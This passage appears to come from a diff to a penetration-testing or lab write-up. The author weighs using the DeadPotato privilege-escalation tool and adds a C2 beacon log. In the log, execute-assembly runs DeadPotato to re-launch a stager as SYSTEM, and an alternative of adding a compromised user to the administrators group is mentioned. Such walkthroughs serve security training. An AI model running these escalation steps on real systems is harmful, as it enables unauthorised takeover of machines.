@@ -864,3 +864,11 @@ So my next step is to use dead potato through execute assembly
 
 I can either use dead potato to re-execute stager with system privileges which should give me another beacon but as SYSTEM this time, or the other options is to use dead potato to run a powershell command and add a previously compromised user like `c.white` to the administrators group!
 
+```python
+[04/08 17:23:19] ethan [e7388118] beacon > execute-assembly /home/kali/hsm/fragments/DeadPotato-NET4.exe -exe C:\Users\sharedadmin\Documents\stager.exe
+[04/08 17:23:19] [*] Task: execute .NET assembly
+[04/08 17:23:20] [*] Agent called server, sent [2.27 Mb]
+```
+
+So ive decided to re-execute the stager
+
